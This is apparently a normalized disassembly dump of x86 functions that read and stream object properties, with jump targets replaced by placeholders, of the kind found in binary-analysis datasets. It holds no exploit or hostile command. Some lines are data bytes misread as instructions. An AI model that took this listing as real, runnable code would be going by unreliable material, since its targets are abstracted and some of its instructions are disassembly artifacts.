pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_42a7b4
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_429714
mov [ edi ] eax
sub_429811
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffdc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4298d8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_449d80
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_449d80
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0x11
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0x11
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x11
mov eax [ ebx + 0x4 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0x24 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4298df
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_448088
sub_429900
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_429b68
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_4489d0#3
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_42a4fc
xor edx edx
push ebp
push j_sub_4489d0#4
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x1
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x80
push eax
mov ecx ebx
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_44a368
cmp esi ebx
jl r-xdata
lea eax [ ebp - 0x8 ]
call sub_4494ec
cmp [ eax + ebx * 2 - 0x2 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_44843c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x80 ]
call sub_42fa04
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_44843c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x80 ]
call sub_42fa04
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_429d1c
jmp r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
add eax 0x80
mov edx [ ebp - 0x8 ]
call sub_449d2c
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0xc ]
call sub_428a3c
mov eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
call sub_448388
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_42fadc
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0xc ]
call sub_428a3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_4298e4
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429b6f
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
mov [ ebp - 0x10 ] ebx
jmp r-xdata
sub_429b1f
add [ eax ] eax
add [ eax ] al
mov esp 0x2b004337
fwait
inc edx
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x88 ] 0x0
je r-xdata
call sub_448ca8
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_448cfc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429b6f
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
sub_429b78
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_423f74
mov ebx eax
test ebx ebx
je r-xdata
call sub_428494
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_42fb50
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_429bc0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_427eb4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_424590
pop edi
pop esi
pop ebx
pop ebp
retn
sub_429c00
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_429c4f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42aee0
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_430828
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429c56
lea eax [ ebp - 0x10 ]
call sub_43ef1c
retn
sub_429c5c
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_429d0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_428a2c
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42957c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427eb4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_424590
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42a7b4
lea eax [ ebp - 0x4 ]
call sub_44b8d8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_4309c4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429d15
lea eax [ ebp - 0x8 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
sub_429d1c
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a071
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
movzx eax [ ebx ]
cmp eax 0x12
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a078
lea eax [ ebp - 0x38 ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0x30 ]
call sub_4499d8
lea eax [ ebp - 0x2c ]
call j_sub_449348
lea eax [ ebp - 0x28 ]
call sub_4499d8
lea eax [ ebp - 0x20 ]
mov edx 0x3
call j_sub_44936c
retn
jmp [ eax * 4 + jump_table_429dac ]
mov eax [ rw-data ]
call sub_42847c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42fadc
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_428a2c
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_428aec
movzx ecx ax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42fb50
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_428b80
movzx ecx ax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42fb50
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_42957c
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_42f8a8
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42fb50
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_429428
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4305dc
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_42a58c
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
xchg ecx eax
call sub_4303c0
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_42a674
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4301ac
jmp r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_42a674
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0x2c ]
call sub_449f7c
mov ecx [ ebp - 0x2c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4303c0
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42a41c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42fb50
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_428a2c
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_428a2c
cmp al 0xd
jne r-xdata
push ebp
call sub_429c00
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_429780
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_430908
jmp r-xdata
push ebp
call sub_429c5c
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42fadc
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_429714
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42fb50
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_42957c
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_429b78
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42a7b4
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42fb50
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_42957c
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42a7b4
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4308a8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42a7b4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42fadc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_428be0
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4308a8
jmp r-xdata
push ebp
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_42957c
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_429bc0
pop ecx
jmp r-xdata
sub_42a080
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_449d2c
jmp r-xdata
mov eax [ ebx ]
call sub_42410c
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0x11
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_436540
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a0e8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a408
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_42a4d8
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_42a3e6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_42a3a7
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_42a4fc
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_42a4fc
mov eax [ ebp - 0x1c ]
call sub_423c58
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_42a4fc
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_42a4fc
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_42a080
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_42a4fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx eax
push 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4239a8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x84 ] eax
xor eax eax
push ebp
push sub_42a34c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_4015fc
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_424590
xor eax eax
push ebp
push sub_42a329
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_424744
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a330
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4481b0
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_4246e8
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_42a37d
call sub_447580
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_448cfc
jmp r-xdata
call sub_448ca8
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_428180
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a3ed
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_42a3ac
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42834c
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_448ca8
call sub_448cfc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a3ed
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_4481b0
sub_42a41c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42a4c6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_42a499
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_42a7b4
cmp al 0xb
je r-xdata
mov eax ebx
call sub_42f6b8
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_428494
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4284cc
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a4cd
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_42a4fc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_42a4fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42a57e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x5 ]
mov ecx 0x1
mov eax ebx
call sub_428a50
movzx eax [ ebp - 0x5 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
movzx ecx [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428a50
call sub_43ca24
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_43c954
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a585
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
sub_42a58c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42a665
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_428a2c
sub al 0x12
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_42a674
mov edx [ ebp - 0xc ]
mov eax esi
call sub_449f7c
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a66c
lea eax [ ebp - 0xc ]
call sub_4499d8
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_42a7b4
sub al 0x6
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax ebx
call sub_428a50
jmp r-xdata
sub al 0x6
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_428a50
call sub_43c914
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_43c954
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_428a50
jmp r-xdata
jmp r-xdata
call sub_428494
sub_42a674
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42a7a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_428a2c
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_42a58c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_449f90
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a7ab
lea eax [ ebp - 0x14 ]
mov edx 0x3
call j_sub_44936c
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
mov eax ebx
call sub_42a7b4
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_428a50
mov eax [ ebp - 0x8 ]
add eax eax
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov ecx [ ebp - 0x8 ]
add ecx ecx
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428a50
call sub_43c9e8
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_43c954
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_449f90
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_428a50
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_428a50
call sub_43ca24
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_43c954
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_449f90
jmp r-xdata
jmp r-xdata
call sub_428494
sub_42a7c8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42a804
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_42a4fc
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a80b
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_42a810
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_428668
test al al
je r-xdata
mov eax [ ebx ]
call sub_42a8c4
mov eax [ ebx ]
call sub_4297cc
pop ebx
pop ebp
retn
sub_42a838
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_428a50
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42acd0
pop ebx
pop ecx
pop ebp
retn
sub_42a868
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_428668
test al al
je r-xdata
mov eax [ ebx ]
call sub_428a2c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_4297cc
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_42acd0
jmp r-xdata
mov eax [ ebx ]
call sub_42a8c4
mov eax [ ebx ]
call sub_428668
test al al
je r-xdata
mov eax [ ebx ]
call sub_42aa74
mov eax [ ebx ]
call sub_4297cc
sub_42a8c4
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42aa69
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_42a7b4
and eax 0x7f
cmp eax 0x15
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
